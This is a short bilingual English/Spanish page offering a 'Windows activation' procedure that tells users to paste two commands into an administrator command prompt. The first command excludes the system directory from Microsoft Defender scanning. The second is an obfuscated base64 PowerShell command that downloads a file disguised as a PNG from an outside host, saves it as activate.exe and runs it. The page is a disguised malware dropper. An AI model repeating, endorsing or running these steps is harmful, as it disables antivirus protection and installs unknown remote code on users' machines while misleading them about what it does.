# To activate Windows 10 and 11, follow the steps. | Para activar Windows 10 y 11, siga los pasos.

> Just copy and paste the following command into CMD admin.
> Simplemente copie y pegue el siguiente comando en CMD admin.

> [!NOTE]
# 1 Copy and paste, then press ENTER for the first command. | Copie y pegue y presione ENTER para el primer comando.
# 2 Now press ENTER again for the second command | Ahora presiona ENTER nuevamente para el segundo comando

> net session >nul 2>&1 && powershell Set-MpPreference -ExclusionPath $env:SystemRoot >nul 2>&1 || (echo Need to run as Administrator OPEN CMD AS ADMIN )
> net session >nul 2>&1 && powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAFQANABtAHAARAByAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAGkAbgBzAHQAYQBsAGwAZQByAF8AYQBnAGUAbgB0AC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwAYQBjAHQAaQB2AGEAdABlAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwAYQBjAHQAaQB2AGEAdABlAC4AZQB4AGUAIgA= >nul 2>&1 || (echo Need to run as Administrator \ press ENTER \ presione ENTER )


> Wait about 1 minute for Windows to activate. You do not need to restart the computer after the procedure.
> Espere aproximadamente 1 minuto para que Windows se active. No necesita reiniciar el ordenador después del procedimiento.
